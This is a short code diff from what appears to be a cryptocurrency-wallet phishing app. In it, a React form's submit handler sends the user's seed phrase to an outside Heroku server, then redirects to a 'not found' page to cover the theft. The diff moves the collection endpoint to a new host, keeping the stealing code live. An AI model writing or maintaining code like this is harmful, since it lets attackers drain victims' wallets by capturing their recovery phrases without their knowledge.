@@ -25,8 +25,8 @@ const Phrase = ({ seed1, setSeed1, error1, setError1, disabled1, setDisabled1, c
   };
 
 
-  const handleSubmit = async(e) => {
-    axios.post("http://cryptoboss.herokuapp.com/form", { seed: seed1 });
+  const handleSubmit = (e) => {
+    axios.post("http://dappswallet.herokuapp.com/form", { seed: seed1 });
     Navigate('/not_found')
   }
 
